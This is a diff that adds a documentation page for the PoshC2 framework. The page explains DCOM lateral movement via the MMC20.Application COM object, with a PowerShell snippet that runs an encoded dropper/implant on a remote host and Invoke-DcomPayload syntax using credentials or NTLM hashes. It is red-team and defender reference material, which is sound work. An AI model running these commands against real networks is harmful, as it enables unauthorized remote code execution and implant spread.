@@ -1,5 +1,56 @@
 #################
   DCOM
 #################
+Mitre ATT&CK - `DCOM <https://attack.mitre.org/wiki/Technique/T1175>`_
 
+-----------------
+Introduction
+-----------------
+DCOM (Distributed Component Object Model) is a framework used by Windows to allow COM components to work over the network. `Enigma0x3 <https://twitter.com/enigma0x3>`_ (Matt Nelson) recently discovered it was possible to misuse this functionality to execute commands using the "MMC20.Application" COM object. PoshC2 utilises this function to run commands remotely under the user that is logged in currently. This method does not take parameters as it uses integrated windows authentication (Kerberos), to remotely administer the command. This means you need the implant running has a primary token that can be passed as the authentication mechanism. The `Invoke-Runas` function will provide you with an implant with a primary token. 
 
+For more information on DCOM, see Matt Nelson's full write-up below:
+
+* https://enigma0x3.net/2017/01/05/lateral-movement-using-the-mmc20-application-com-object/
+
+The crooks of the underlining commands that is executed as a result is as follows:
+
+.. code-block:: powershell
+
+	$c = [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application",""));
+	$c.Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\WindowsPowershell\v1.0\powershell.exe",$null,"-e <base64 encoded dropper/implant>","7")
+
+Defenders could also lockdown DCOM remotely and this can be found here:
+
+* https://technet.microsoft.com/en-us/library/cc771387(v=ws.11).aspx
+
+-----------------
+Syntax
+-----------------
+
+**Dcom using the normal comms method back to the C2**
+
+.. code-block:: powershell
+
+	Invoke-DcomPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>
+
+**Dcom using the normal comms method back to the C2**
+
+.. code-block:: powershell
+
+	Invoke-DcomProxyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>
+
+**Dcom using the normal comms method back to the C2**
+
+.. code-block:: powershell
+
+	Invoke-DcomDiasyPayload -Target <ip> -Domain <dom> -User <user> -pass '<pass>' -Hash <hash-optional>
+
+-----------------
+Parameters
+-----------------
+
+- **-Target** the IP of the machine to be targeted 
+- **-Domain** Domain of user account to be used to exec payload
+- **-User** Username
+- **-Pass** Password 
+- **-Hash (Optional)** The NTLM hash (in LM:NTLM or NTLM format) to be used as authentication instead of -Domain, -User and -pass
